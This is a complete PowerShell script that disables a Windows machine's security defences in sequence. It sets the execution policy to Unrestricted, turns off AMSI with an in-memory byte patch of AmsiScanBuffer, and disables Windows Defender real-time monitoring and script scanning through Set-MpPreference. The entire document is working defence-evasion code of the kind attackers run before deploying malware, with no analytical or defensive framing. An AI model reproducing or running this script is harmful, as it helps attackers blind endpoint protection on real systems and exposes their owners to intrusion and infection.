# Function to set PowerShell execution policy to unrestricted
function Set-ExecutionPolicyUnrestricted {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
        Write-Output "Execution policy set to Unrestricted."
    } catch {
        Write-Error "Failed to set execution policy: $_"
    }
}

# Function to disable AMSI protection
function Disable-AMSI {
    try {
        $Script:AMSIBypass = @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Bypass() {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(hModule, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        Marshal.WriteByte(addr, 0xC3);
        VirtualProtect(addr, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"@
        Add-Type -TypeDefinition $AMSIBypass
        [AMSI]::Bypass()
        Write-Output "AMSI protection disabled."
    } catch {
        Write-Error "Failed to disable AMSI protection: $_"
    }
}

# Function to disable Windows Defender real-time protection
function Disable-WindowsDefender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -Force
        Write-Output "Windows Defender real-time protection disabled."
    } catch {
        Write-Error "Failed to disable Windows Defender: $_"
    }
}

# Function to disable script runtime protection
function Disable-RuntimeProtection {
    try {
        Set-MpPreference -DisableScriptScanning $true -Force
        Write-Output "Script runtime protection disabled."
    } catch {
        Write-Error "Failed to disable script runtime protection: $_"
    }
}

# Main script execution
Set-ExecutionPolicyUnrestricted
Disable-AMSI
Disable-WindowsDefender
Disable-RuntimeProtection
